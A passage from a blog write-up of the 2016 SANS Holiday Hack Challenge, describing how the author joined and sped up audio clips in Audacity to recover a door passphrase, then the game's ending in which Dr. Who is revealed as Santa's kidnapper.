We now have 7 audio files.  Listening to each one, you don’t hear much, but the overall tone suggests to me that the final file has been slowed somewhat.  So I open up Audacity and put all the files into one project.  Then I used the option "Tracks > Align Tracks > Align End to End" to place the tracks into a series, with the resulting audio concatenated like this:

![](/img/blog/hhc2016/image_19.png)

I wasn’t sure if numerical order would be the right order, but the amplitude of the end of each piece looked similar to the amplitude of the beginning of the next piece and playing the audio sounded rather continuous, but still unintelligible, so I decided to proceed.  (I was hoping nobody was going to make me try all 5040 permutations of audio!)  I merged the tracks together (via Tracks > Mix and Render) and then changed the tempo (via Effects > Change Tempo) by about 600%.  It still didn’t sound quite right, but was close enough that I could make out the message:

"Merry Christmas, Santa Claus, or as I have always known him, Jeff"

It wasn’t clear to me what to do with the audio, or how this would help to find the kidnapper, but since there’s still one door that I didn’t have the password to (the corridor behind Santa’s office), I decided to try and see if this helped with getting past the door.

### Santa’s Kidnapper

![](/img/blog/hhc2016/image_20.png)

I was honestly a little surprised when the "Nice" light flashed and I was past the last locked door!  As soon as I was through, I was in a small dark room with a ladder going up.  I actually hesitated to click up the ladder, because part of me didn’t want the game to be over.  But without anything else to do in the game (except collect NetWars coins… that took a little extra time) I clicked up the ladder, expecting a nefarious villain, and finding…. Dr. Who?

![](/img/blog/hhc2016/image_21.png)

But why, Dr. Who, why?  I can’t, for the life of me, imagine a reason to kidnap Santa Claus and take him back to 1978.

![](/img/blog/hhc2016/image_22.png)![](/img/blog/hhc2016/image_23.png)

As told in his own words:

`<Dr. Who> - I have looked into the time vortex and I have seen a universe in which the Star Wars Holiday Special was NEVER released. In that universe, 1978 came and went as normal. No one had to endure the misery of watching that abominable blight. People were happy there. It's a better life, I tell you, a better world than the scarred one we endure here.`

Well, actually, I think I have to agree with the Doctor.  The world would be a much better place without the Star Wars Holiday Special, but the ends do not justify the means, however Santa was returned in time to complete his Christmas rounds and deliver the toys via portal to all the white hat boys and girls of the world.  (And perhaps a few of the grey hats too…)

![](/img/blog/hhc2016/image_24.png)

